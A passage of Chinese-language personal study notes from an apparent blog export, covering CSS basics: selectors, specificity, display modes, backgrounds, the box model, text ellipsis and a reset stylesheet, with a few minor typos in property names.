class="line">    <span class="comment">/* 下面俩句是为了照顾兼容性 */</span></span><br><span class="line">    <span class="comment">/* transparent(透明色的意思) */</span></span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border</span>: solid transparent <span class="number">10px</span>;</span><br><span class="line">    <span class="comment">/* (给指定的边加颜色的意思) */</span></span><br><span class="line">    <span class="attribute">border-bottom-color</span>: <span class="built_in">rgb</span>(<span class="number">150</span>, <span class="number">150</span>, <span class="number">130</span>);</span><br></pre></td></tr></table></figure><h1 id="CSS用户界面相关样式"><a href="#CSS用户界面相关样式" class="headerlink" title="CSS用户界面相关样式"></a>CSS用户界面相关样式</h1><p>说明:更改一些用户操作样式</p><h2 id="鼠标样式"><a href="#鼠标样式" class="headerlink" title="鼠标样式"></a>鼠标样式</h2><blockquote><p>1.CSS格式:    <code>cursor:属性值</code>  ==&gt; 在特定盒子检索,切换鼠标的预定义样式，这里只做简述。</p><p>2.属性值说明:  </p></blockquote><pre><code>default 小白箭头 默认pointer 小手move    移动text    文本not-allowed 禁止</code></pre><h2 id="表单的轮廓线"><a href="#表单的轮廓线" class="headerlink" title="表单的轮廓线"></a>表单的轮廓线</h2><pre><code>如果没什么修饰直接点击文本框时,文本框会默认带上轮廓线==&gt; 取消轮廓线的方法: outline :none;</code></pre><h2 id="文本域拖拽问题"><a href="#文本域拖拽问题" class="headerlink" title="文本域拖拽问题"></a>文本域拖拽问题</h2><pre><code>resize:none;  &gt;&gt; 消除文本域的右下角拖拽块</code></pre><h1 id="设置元素居中对齐"><a href="#设置元素居中对齐" class="headerlink" title="设置元素居中对齐"></a>设置元素居中对齐</h1><pre><code>0. 属性名：vertical-align1. 说明:设置表单/图片  和文字的居中对齐   ==&gt;针对于行内元素/行内块元素设置一个元素的居中对齐方式    2. 属性值(所有的线都是横线,没有竖线)        baseline  默认把元素放在父元素的基线上          ==&gt;基线     字母a的底部(默认)        top       把元素的顶端与行内元素最高的顶端对齐    ==&gt;顶线     字符最顶        middle    把元素放置在父元素的中部              ==&gt; 中线      字符中央        bottom    把元素的顶端与行中最低的元素的顶端对齐   ==&gt;底线      文字最底3.解决文字底部空白缝隙的bug ==&gt; 只要对齐不要基线对齐就行/或者display:block;(转为块?不推荐.)</code></pre><h1 id="溢出文字省略号显示"><a href="#溢出文字省略号显示" class="headerlink" title="溢出文字省略号显示"></a>溢出文字省略号显示</h1><pre><code>1.单行文本溢出显示省略号---必须满足三个条件    //1.先强制一行内显示文本    white-space:nowrap;(默认normal自动换行)    //2.超出的部分隐藏    overflow:hidden;    //3.文字省略号代替超出的部分    text=overflow:ellipsis;2.多行文本溢出(了解)  ==&gt; 推荐后台人员来设置这个效果,因为他们能控制字数显示多少    有较大的兼容性问题,适用webKit浏览器或移动端    overflow: hidden;    text-overflow: ellipsis;    弹性伸缩盒子模型显示    display: -webkit-box;    限制在一个块元素显示的文本的行数     -webkit-line-clamp: 2;    设置或检索伸缩盒对象的子元素的排列方式    -webkit-box-orient: vertical;</code></pre><h1 id="布局技巧"><a href="#布局技巧" class="headerlink" title="布局技巧"></a>布局技巧</h1><pre><code>1.margin负值    使用margin-left:-1px;可以使两边边框合并为1,使得边框加和不会出现1+1=2的效果(简单来讲,盒子压盒子)    ==&gt;细线边框效果2.文字围绕浮动元素    利用浮动元素不会压住文字的特性3.行内块元素的巧妙运用    利用行内块的自带间距/可调大小来控制底部类似于导航栏的换页按钮排布4.三角强化    妥当的控制三角的边关系,以达到控制三角的形状    也就是在前面三角的基础上,对边进行控制即可</code></pre><h1 id="网页初始化样式"><a href="#网页初始化样式" class="headerlink" title="网页初始化样式"></a>网页初始化样式</h1><p>每个网页都需要使用CSS进行样式的初始化</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 清除所有标签的内外边距 */</span></span><br><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 清除斜体文字 */</span></span><br><span class="line"><span class="selector-tag">em</span>,</span><br><span class="line"><span class="selector-tag">i</span> &#123;</span><br><span class="line">    <span class="attribute">font-style</span>: normal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 去除小圆点 */</span></span><br><span class="line"><span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">    <span class="comment">/* 照顾低版本浏览器(兼容性) 如果图片外面包含链接会有边框的问题*/</span></span><br><span class="line">    <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 取消图片地测有空白缝隙的问题 */</span></span><br><span class="line">    <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">button</span> &#123;</span><br><span class="line">    <span class="comment">/* 鼠标经过时变小手 */</span></span><br><span class="line">    <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="comment">/* 取消下划线 */</span></span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="comment">/* css3的一个特性,文字放大抗锯齿性 (了解)*/</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    宋体    \9ED1\4F53</span></span><br><span class="line"><span class="comment">    黑体    \5B8B\4F53</span></span><br><span class="line"><span class="comment">    微软雅黑 \5FAE\8F6F\69C5\9ED1</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    -webkit-<span class="attribute">font-smoothing</span>: antialiased;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">button</span>,</span><br><span class="line"><span class="selector-tag">input</span> &#123;</span><br><span class="line">    <span class="comment">/* 控制字体,如果是中文的话需要转换为Unicode编码再写进来才不会乱码(某些浏览器解析会出现乱码的情况) */</span></span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&#x27;Courier New&#x27;</span>, Courier, monospace;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 清除浮动 */</span></span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:before</span>,</span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="attribute">display</span>: table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.clearfix</span> &#123;</span><br><span class="line">    *zoom: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> html </tag>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端学习-css-01-基础概述</title>
      <link href="/2023/02/10/web-study-03/"/>
      <url>/2023/02/10/web-study-03/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS-简介"><a href="#CSS-简介" class="headerlink" title="CSS 简介"></a>CSS 简介</h1><pre><code>CSS-层叠样式表( Cascading Style Sheets)，简称css有时我们也会称之为CSS式表或级联样式表CSS是也是一种标记语言CSS 主要用于设置HTML 页面中的文本内容(字体、大小、对齐方式等)图片的外形(宽高、边框样式边距等)以及版面的布局和外观显示样式总结:html(结构)与css(样式)相分离(这个思想做项目会直接用到)</code></pre><span id="more"></span><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>选择器分为 <strong>基础选择器</strong> 和 <strong>复合选择器</strong> 两个大类</p><h4 id="基础选择器"><a href="#基础选择器" class="headerlink" title="基础选择器"></a>基础选择器</h4><p>基础选择器是由单个选择器组成的</p><p>基础选择器又包括: <strong>标签选择器 类选择器 id选择器 和 通配符选择器</strong></p><ol><li><p><strong>类选择器</strong></p><p> (1) 被一个或者多个调用,开发常用</p><p> (2) 命名要有意义,类名可以用’-‘,用英文为最佳</p><p> (1) <strong>多类名</strong> :一个标签的调用多个类的方式</p> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;name1 name2&#x27;</span>&gt;</span> (name1为类名,加类时只要将类与类中间使 用空格隔开就行)</span><br><span class="line">==&gt; 可以使得标签产生 公共类 和 私有类</span><br><span class="line">==&gt; 公告类:公共属性</span><br><span class="line">==&gt; 私有类:自己特有的属性</span><br><span class="line"></span><br><span class="line">多类名可以使得一些类作为基础，另外一些类作为增加功能来引入。</span><br></pre></td></tr></table></figure></li><li><p><strong>标签选择器</strong></p><p> ( 1 ) 只能调用一次,别人切勿使用(唯一性)</p><p> ( 2 ) 样式 <strong>#</strong> 定义,结构 <strong>id</strong> 使用(#是放在style里面或者css文件里面的，id是放在标签里面的)</p></li><li><p><strong>通配符选择器</strong></p><p> ( 1 ) 样式符号: *</p><p> ( 2 ) 默认选择所有的样式</p></li></ol><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><h3 id="字体属性"><a href="#字体属性" class="headerlink" title="字体属性"></a>字体属性</h3><table><thead><tr><th>属性名:属性值</th><th>简单说明</th><th>详细说明</th></tr></thead><tbody><tr><td>font-family:’微软雅黑’</td><td>控制文字字体</td><td>选择字体即可调用对应字体,多个字体就使用逗号分隔,英文兼容性好些</td></tr><tr><td>font-size:20px;</td><td>控制文字大小</td><td>-</td></tr><tr><td>font-weight: 500;</td><td>控制文字粗细</td><td>-</td></tr><tr><td>font-style: normal/italic;</td><td>字体标准/斜体样式</td><td>常用:将em i 标签改为标准风格,很少改为斜体的.</td></tr><tr><td><strong>font</strong> : <strong>font-style font-weight font-size/line-height font-family;</strong></td><td>统一操作文字属性</td><td>这是字体的复合属性,将多个属性糅合在一起</td></tr></tbody></table><span style="color:red;font-weight:700" >==>注意!字体复合属性不能随意颠倒各值的顺序!</span><h3 id="文本属性-外观样式"><a href="#文本属性-外观样式" class="headerlink" title="文本属性(外观样式)"></a>文本属性(外观样式)</h3><table><thead><tr><th>属性名:属性值</th><th>简单说明</th><th>详细说明</th></tr></thead><tbody><tr><td>color:red ;</td><td>文本颜色</td><td>有预定义颜色:red,green,blue等;<br>十六进制颜色:#FFF,#000等;<br>RGB代码:rgb(0,0,0),rgb(255,255,255)等.</td></tr><tr><td>text-align: center;</td><td>文本对齐方式</td><td>居中/向左/向右对齐<br>(center/left/right)</td></tr><tr><td>text-decoration: none;(默认)</td><td>文本修饰</td><td>添加下划线(常用)/上划线/删除线等<br>underline/overline/line-through</td></tr><tr><td>text-index: 10px;</td><td>首行缩进</td><td>每个段落的第一行进行缩进(也就是&lt;p&gt;)<br>或者使用em作为单位em为当前元素字体的单位,2em表示俩字体</td></tr><tr><td>line-height:30px;</td><td>控制行高</td><td>行间距由上下间距和文本高度组成,也就是行高.</td></tr></tbody></table><pre><code>==&gt;测量行高的办法:从多行文本的第一行文本最下底量到第二行文本的最下底.</code></pre><h3 id="css的引入"><a href="#css的引入" class="headerlink" title="css的引入"></a>css的引入</h3><blockquote><p>1)内部样式表 &gt;&gt; <code>&lt;style&gt;&lt;/style&gt;</code></p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="comment">/* 选择器 &#123;样式&#125; */</span></span></span><br><span class="line"><span class="language-css">    <span class="comment">/* 某标签或者id/class &#123;属性:值;属性:值;&#125; */</span></span></span><br><span class="line"><span class="language-css">    <span class="comment">/* 选择器命名调用:</span></span></span><br><span class="line"><span class="comment"><span class="language-css">    1.标签名</span></span></span><br><span class="line"><span class="comment"><span class="language-css">    1.  .类选择器 </span></span></span><br><span class="line"><span class="comment"><span class="language-css">    2.  #id选择器</span></span></span><br><span class="line"><span class="comment"><span class="language-css">    </span></span></span><br><span class="line"><span class="comment"><span class="language-css">    举个例子</span></span></span><br><span class="line"><span class="comment"><span class="language-css">    */</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>2)行内样式表 &gt;&gt; <code>&lt;div style=&#39;color:red;&#39;&gt;</code><br>3)<span style="color:red;font-weight:700" >外部样式表</span> &gt;&gt; <code>&lt;line rel=&#39;stylesheet&#39; href=&#39;css文件路径&#39;&gt;</code>  &gt;&gt; 吐血推荐</p></blockquote><h3 id="emmet语法"><a href="#emmet语法" class="headerlink" title="emmet语法"></a>emmet语法</h3><blockquote><ol><li><p>概念:快速构建网页</p><blockquote><p>在VScode里面安装完成插件后，使用英文的“!”打在空白“.html”文件当中，就会出现快速生成html骨架的提示。</p></blockquote></li><li><p>html其他生成功能概述:</p><blockquote><ol><li><p>标签的快速生成，也就是说，输入标签名自动提示相关的标签</p></li><li><p>div*3  快速生成3个标签</p></li><li><p>ul&gt;li  快速创建父子集标签</p></li><li><p>div+p  快速生成兄弟集标签</p></li><li><p>.demo或者#laobel并按下tab  快速生成对应id/class标签</p></li><li><p>$ 自增符号,从1开始.</p></li><li><p>{} 给生成的标签内部写东西</p></li></ol></blockquote></li><li><p>属性与值的生成提示.</p></li><li><p>快速格式化代码:_<em>shift+alt+f</em></p></li></ol></blockquote><h1 id="复合选择器"><a href="#复合选择器" class="headerlink" title="复合选择器"></a>复合选择器</h1><blockquote><p><strong>概述</strong> :<br>基本选择器的组合</p><p>复合选择器可以更准确、更高效的选择目标元素(标签)</p><p>复合选择器是由两个或多个基础选择器，通过不同的方式组合而成的</p><p>常用的复合选择器包括: <strong>后代选择器、子选择器、并集选择器、伪类选择器等等</strong></p><p><strong>复合选择器说明</strong></p></blockquote><h2 id="后代选择器-重要"><a href="#后代选择器-重要" class="headerlink" title="后代选择器(重要)"></a>后代选择器(重要)</h2><blockquote><p>(1) <strong>概念</strong> ： 又称为包含选择器，可以选择 <strong>父元素里面子元素</strong> 。其写法就是把 <strong>外层标签</strong> 写在 <strong>前</strong> 面，<strong>内层标签写</strong> 在 <strong>后</strong> 面，中间用 <strong>空格</strong> 分隔。当标签发生嵌套时， <strong>内层标签</strong> 就成为 <strong>外层标签</strong> 的 <strong>后代</strong> 。</p><p>(2) <strong>css写法</strong> : <code>元素1 元素2 &#123;属性:值;&#125;</code>   ==&gt; <strong>元素1</strong> 是 <strong>元素2</strong> 的 <strong>父标签/元素</strong> ,修改的是 <strong>元素2</strong> 的 <strong>属性</strong></p><p>(3) <strong>实例</strong> : <code>ul li &#123;color:red;&#125;</code>  </p><p>(4) <strong>影响</strong> ： 注意,这是选出所有标签为“li”的子元素!包括子子子选择器!</p></blockquote><h2 id="子选择器-亲儿子选择器"><a href="#子选择器-亲儿子选择器" class="headerlink" title="子选择器(亲儿子选择器)"></a>子选择器(亲儿子选择器)</h2><blockquote><p>(1) <strong>概念</strong> ：最近一级子元素,也就是亲儿子</p><p>(2) <strong>css写法</strong> : <code>ul&gt;a &#123;color:red;&#125;</code>  </p><p>(3) <strong>影响</strong> ：变更只变更到子一级过,子子级或者其他级无法受到影响</p></blockquote><h2 id="并集选择器-重要"><a href="#并集选择器-重要" class="headerlink" title="并集选择器(重要)"></a>并集选择器(重要)</h2><blockquote><p>(1) <strong>概念</strong> ：多组标签相同样式,任何形式都可以,以’,’连接.   一般是竖着写的.</p><p>(2) <strong>css写法</strong> : <code>#d1,#d2, ul li &#123;color:red;&#125;</code></p></blockquote><h2 id="伪类选择器"><a href="#伪类选择器" class="headerlink" title="伪类选择器"></a>伪类选择器</h2><blockquote><p>(1) <strong>伪类选择器</strong></p><blockquote><p>伪类选择器用于向某些选择器添加特殊的效果，比如 __给链接添加特殊效果__，或 <strong>选择</strong> 第1个，第n个 <strong>元素</strong> .</p></blockquote><blockquote><p>伪类选择器书写最大的特点是用冒号(<strong>:</strong>)表示，比如:hover 、 :first-child。</p></blockquote><blockquote><p>因为伪类选择器很多，比如有 <strong>链接伪类__、__结构伪类</strong> 等，所以这里先给大家讲解常用的链接伪类选择器</p></blockquote><p>(2) <strong>各类伪类</strong></p><p>&lt;1&gt; 链接伪类(声明顺序&gt;lvha):(样式需要单独指定)</p></blockquote><pre><code> a:link      选择所有未被访问的链接 a:visited   选择所有已被访问的链接 a:hover     选择鼠标指针位于其上的链接(鼠标经过)  (&lt;常用&gt;) a:active    选择活动链接(鼠标按下未弹起)(鼠标点击不松动)</code></pre><blockquote><p>&lt;2&gt; focus伪类选择器</p><ol><li>概念: 用于选取获得焦点光标的表单元素(获得光标,一般为input)</li><li>格式: 下面是表单被选中时临时更换颜色</li></ol></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">input:focus &#123;</span><br><span class="line">    background-color:yellow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="元素的显示模式"><a href="#元素的显示模式" class="headerlink" title="元素的显示模式"></a>元素的显示模式</h1><blockquote><p><strong>什么是元素显示模式</strong></p><p><strong>作用</strong> :网页的标签非常多，在不同地方会用到不同类型的标签，了解他们的特点可以更好的布局我们的网页</p><p><strong>元素显示模式</strong> :元素(标签)以 <strong>什么方式</strong> 进行 <strong>显示</strong> ，比如<code>&lt;div&gt;</code>自己占一行，比如一行可以放多个<code>&lt;span&gt;</code>.</p><p>HTML元素一般分为  <strong>块元素</strong> 和 <strong>行内元素</strong> 两种类型</p></blockquote><h1 id="块元素与行内元素"><a href="#块元素与行内元素" class="headerlink" title="块元素与行内元素"></a>块元素与行内元素</h1><h2 id="块元素"><a href="#块元素" class="headerlink" title="块元素"></a>块元素</h2><p>常见的块元素有<code>&lt;h1&gt;~&lt;h6&gt;、&lt;p&gt;、&lt;div&gt;、&lt;ul&gt;、&lt;ol&gt;、&lt;li&gt;</code>等，其中<code>&lt;div&gt;</code>标签是最典型的块元素</p><blockquote><p>块级元素的特点</p><p>(1) 比较霸道，自己独占一行。</p><p>(2) 高度，宽度、外边距以及内边距都可以控制</p><p>(3) 宽度默认是容器(父级宽度)的100%。</p><p>(4) 是一个容器及盒子，里面可以放行内或者块级元素</p></blockquote><p><strong>注意</strong></p><blockquote><p>文字类的元素内不能使用块级元素</p><p>标签<code>&lt;p&gt;</code>主要用于存放文字</p><p>此<code>&lt;p&gt;</code>里面不能放块级元素，特别是不能放<code>&lt;div&gt;</code></p><p>同理，<code>&lt;h1&gt;~&lt;h6&gt;</code>等都是文字类块级标签，里面也不能放其他块级元素</p></blockquote><h2 id="行内元素"><a href="#行内元素" class="headerlink" title="行内元素"></a>行内元素</h2><p>常见的行内元素有<code>&lt;a&gt;、&lt;strong&gt;、&lt;b&gt;、&lt;em&gt;、&lt;i&gt;、&lt;del&gt;&lt;s&gt;、&lt;ins&gt;、&lt;u&gt;、&lt;span&gt;</code>等，其中<code>&lt;span&gt;</code>标签是最典型的行内元素。有的地方也将行内元素称为内联元素.</p><p><strong>行内元素的特点</strong> :</p><blockquote><p>相邻行内元素在一行上，一行可以显示多个</p><p>高、宽直接设置是无效的</p><p>默认宽度就是它本身内容的宽度</p><p>行内元素只能容纳文本或其他行内元素</p></blockquote><p><strong>注意</strong></p><blockquote><p>链接里面不能再放链接</p><p>特殊情况链接<code>&lt;a&gt;</code>里面可以放块级元素，但是给<code>&lt;a&gt;</code>转换一下块级模式最安全 <code>(display:block)</code></p></blockquote><h2 id="行内块元素"><a href="#行内块元素" class="headerlink" title="行内块元素"></a>行内块元素</h2><blockquote><p>在行内元素中有几个特殊的标签它们同时具有块元素和行内元素的特点。<code>&lt;img/&gt; &lt;input/&gt; &lt;td&gt;.</code><br>有些资料称它们为行内块元素。</p></blockquote><p><strong>行内块元素的特点</strong></p><blockquote><p>和相邻行内元素(行内块)在一行，但是他们之间会有空白间隙。一行可以显示多个(行内元素特点)。</p><p>默认宽度就是它本身内容的宽度(行内元素特点)</p><p>高度，行高、外边距以及内边距都可以控制( 块级元素特点)。</p></blockquote><h2 id="元素显示模式转换-display"><a href="#元素显示模式转换-display" class="headerlink" title="元素显示模式转换(display)"></a>元素显示模式转换(display)</h2><blockquote><p>转换为 <strong>行内</strong> 元素: <strong>display: inline</strong> ;</p><p>转换为 <strong>块</strong> 元素: <strong>display: block</strong> ;</p><p>转换为 <strong>行内块</strong> 元素: <strong>display: inline-block</strong> ;</p></blockquote><h1 id="css背景样式"><a href="#css背景样式" class="headerlink" title="css背景样式"></a>css背景样式</h1><h2 id="背景样式汇总（所学的）"><a href="#背景样式汇总（所学的）" class="headerlink" title="背景样式汇总（所学的）"></a>背景样式汇总（所学的）</h2><table><thead><tr><th>属性名:属性值</th><th>简单说明</th><th>详细说明</th></tr></thead><tbody><tr><td>background-color: red</td><td>背景色</td><td>transparent<br>(默认透明色)<br>特定色(red,blue…)<br> rgb(0,0,0) <br>16进制色#000</td></tr><tr><td>bacground-img: none</td><td>背景图片</td><td>none或url(图片地址);<br>常常作为小图片控件</td></tr><tr><td>background-repeat : repeat</td><td>背景平铺</td><td>repeat(平铺) no-repeat(不平铺) )<br>repeat-x(仅沿x轴平铺 ) repeat-y(仅沿y轴平铺)<br></td></tr><tr><td>background-position: x y;</td><td>背景图片位置</td><td>x y 可以为长度单位(px等)<br>也可以为方位名词)<br>(left right bottom center))<br>单个方位名词时默认其他方位居中)<br>精确坐标第一个一定是x)<br>精确单位与单位名词可以混合使用</td></tr><tr><td>background-attachment: fixed;</td><td>背景图像固定</td><td>scroll(滚动),fixed(固定)</td></tr><tr><td>background-color: rgba(0,0,0,0.3)</td><td>半透明效果背景色</td><td>通过控制rgb后面的小数设置透明度,取值范围0~1</td></tr></tbody></table><h2 id="复合背景样式"><a href="#复合背景样式" class="headerlink" title="复合背景样式"></a>复合背景样式</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">background</span>: 背景色 背景图地址 背景平铺 背景滚动/固定 背景图位置;</span><br></pre></td></tr></table></figure><span style="color:red;font-weight:700" >注意！这个复合样式可以随意调换位置！</span><h1 id="CSS三大特性-重要★☾★☽★"><a href="#CSS三大特性-重要★☾★☽★" class="headerlink" title="CSS三大特性(重要★☾★☽★)"></a>CSS三大特性(重要★☾★☽★)</h1><h2 id="层叠性-覆盖"><a href="#层叠性-覆盖" class="headerlink" title="层叠性(覆盖)"></a>层叠性(覆盖)</h2><p><strong>概念</strong> </p><pre><code>样式冲突   就近原则,哪个距离被修饰的结构近就用哪个修饰样式不冲突 不会层叠</code></pre><h2 id="继承性"><a href="#继承性" class="headerlink" title="继承性"></a>继承性</h2><p><strong>概念</strong></p><pre><code>继承父元素样式   子承父业</code></pre><p><strong>特殊情况:行高继承性</strong> </p><p>属性<code>font-size: 14px/1.5;</code> → 意思是当前元素字体大小的1.5倍大的行高.</p><p>(也就是说,继承过来的行高取决于字体大小和倍数的乘积…)</p><h2 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h2><p><strong>概念</strong><br>选择器权重</p><table><thead><tr><th>选择器</th><th>选择器权重</th></tr></thead><tbody><tr><td>继承或者 *</td><td>0,0,0,0</td></tr><tr><td>元素选择器</td><td>0,0,0,1</td></tr><tr><td>类选择器伪类选择器</td><td>0,0,1,0</td></tr><tr><td>ID选择器</td><td>0,1,0,0</td></tr><tr><td>行内样式 <code>style=&quot;&quot;</code>(例如<code>&lt;div style=&quot;&quot; &gt;</code>)</td><td>1,0,0,0</td></tr><tr><td>!important 重要的</td><td>无穷大</td></tr></tbody></table><p><strong>权重注意点</strong> :</p><p>权重的大小是不变的,权重的比较类似于二进制.</p><p><strong>优先级注意点</strong> :</p><blockquote><p>1.权重是有4组数字组成但是 <strong>不会有进位!</strong></p><p>2.可以理解为 <strong>类选择器</strong> 永远大于 <strong>元素选择器</strong> , <strong>id选择器</strong> 永远大于 <strong>类选择器</strong>,以此类推</p><p>3.等级判断 <strong>从左向右</strong> ，如果某一位 <strong>数值相同</strong> ，则 <strong>判断下一位</strong> 数值</p><p>4.可以简单记忆法: 通配符和继承 <strong>权重为0</strong> ,标签选择器为1,类(伪类)选择器为10,id选择器100,行内样式表为1000,!important无穷大</p><p>5.<strong>继承的权重是0</strong> ,如果该元素没有直接选中，不管父元素权重多高，子元素得到的权重都是0。<br>==&gt;也就是说,从父亲继承的权重是0,单独列出子元素指定属性时,会覆盖继承的权重</p></blockquote><h3 id="权重叠加"><a href="#权重叠加" class="headerlink" title="权重叠加"></a>权重叠加</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">复合选择器权重叠加问题</span><br><span class="line">ul li &#123;...&#125; </span><br><span class="line">li &#123;&#125;  ==&gt;两者同时操作li标签,但由于权重叠加,必须计算: </span><br><span class="line">ul li 的权重:0,0,0,1 + 0,0,0,1 = 0,0,0,2</span><br><span class="line">li1的权重: 0,0,0,1  ==&gt;小于ul li的权重,所以继承ul li的属性  </span><br></pre></td></tr></table></figure><h1 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h1><h2 id="网页布局3大核心"><a href="#网页布局3大核心" class="headerlink" title="网页布局3大核心"></a>网页布局3大核心</h2><pre><code>盒子模型/浮动/定位</code></pre><h2 id="看透网页布局的本质"><a href="#看透网页布局的本质" class="headerlink" title="看透网页布局的本质"></a>看透网页布局的本质</h2><pre><code>网页布局过程1.先准备好相关的网页元素，网页元素基本都是盒子Box2.利用CSS设置好盒子样式，然后摆放到相应位置3.往盒子里面装内容</code></pre><span style="color:red;font-weight:700" >网页布局的核心本质: 利用CSS摆盒子.</span><p><strong>盒子模型概念</strong> :就是把HTML页面中的布局元素看作是一个 <strong>矩形的盒子</strong> ，也就是一个盛装内容的 <strong>容器</strong></p><p><strong>CSS盒子模型</strong> 本质上是一个盒子，封装周围的HTML元素，它包括: <strong>边框(border)</strong> 、<strong>外边距(margin)</strong> 、<strong>内边距(padding)</strong> 和 <strong>实际内容(content)</strong></p><h2 id="border边框样式表"><a href="#border边框样式表" class="headerlink" title="border边框样式表"></a>border边框样式表</h2><table><thead><tr><th>属性名</th><th>具体样式</th><th>相关说明</th><th>属性值</th></tr></thead><tbody><tr><td>border</td><td>border-width</td><td>边框的粗细</td><td>单位可以是px等</td></tr><tr><td>border</td><td>border-color</td><td>边框的颜色</td><td>颜色值可以是red，rgb或者#</td></tr><tr><td>border</td><td>border-style</td><td>边框的样式</td><td>none(无边框) hidden(隐藏边框) dottend(点线 )<br> dashed(虚线) solid(实线) double(双线) <br>groove(3D凹槽) ridge(棱形)  inset(3d凹边)<br>  outset(3d凸边)<br> <strong>注意</strong> :测量时边框会影响盒子的大小</td></tr><tr><td>border</td><td><br>border-left<br>border-right<br>border-top<br>border-bottom</td><td>具体位置上的边框</td><td>样式为复合样式，囊括前面三种。</td></tr></tbody></table><h2 id="margin外边距控制"><a href="#margin外边距控制" class="headerlink" title="margin外边距控制"></a>margin外边距控制</h2><blockquote><ol><li><strong>css格式</strong> : <code>margin: top right bottom left</code>这个是复合写法,可以写成<code>margin-top:12px;</code>的格式;</li><li><strong>影响</strong> :盒子与盒子间的距离</li><li><strong>另外一种用途</strong> :设置水平居中 &gt;&gt;&gt; <code>margin:auto;</code>  &gt;&gt;&gt; 前提:盒子有宽度</li><li><strong>外边距塌陷问题</strong> :</li></ol></blockquote><pre><code>当父元素与子元素(嵌套)同时设置外边距时,父元素会塌陷较大外边距的值解决办法:(可以定义透明边框)    ① 给父元素定义上边框    ② 给父元素定义上内边距    ③ 给父元素添加overflow:hidden  ★★★★★★</code></pre><h2 id="padding内边距控制"><a href="#padding内边距控制" class="headerlink" title="padding内边距控制"></a>padding内边距控制</h2><blockquote><ol><li><strong>css格式</strong>:   <code>padding: top right bottom left</code> 和margin一样，这是复合写法，也可以写成<code>padding-top:12px;</code>的格式</li><li><strong>影响盒子实际大小</strong> ==&gt; 盒子宽高减去内边距</li><li><strong>其他情况</strong> : 盒子没有指定宽高 &gt;&gt; 不会撑开盒子</li></ol></blockquote><h2 id="content"><a href="#content" class="headerlink" title="content"></a>content</h2><p><strong>注意</strong> :行内元素为了照顾兼容性，尽量只设置 <strong>左右内外边距</strong> ，<strong>不要</strong> 设置 <strong>上下内外边距</strong> 。但是转换为块级和行内块元素就可以了.</p><blockquote><p>Pink老师总结</p><p>1.布局为啥用不同盒子,我只想用div ?</p><blockquote><p>标签都是有语义的,合理的地方用合理的标签。比如产品标题就用h，大量文字段落就用p <strong>(个人：后面做项目时布局确实如此，有语意的标签读起来更好理解)</strong></p></blockquote><p>2.为啥用辣么多类名 ?</p><blockquote><p>类名就是给每个盒子起了一个名字,可以更好的找到这个盒子选取盒子更容易 <strong>后期维护也方便</strong></p></blockquote><p>3.到底用 margin还是 padding ?</p><blockquote><p>大部分情况两个可以混用，两者各有优缺点，但是根据实际情况，总是有更简单的方法实现</p></blockquote></blockquote><h2 id="css3后增样式"><a href="#css3后增样式" class="headerlink" 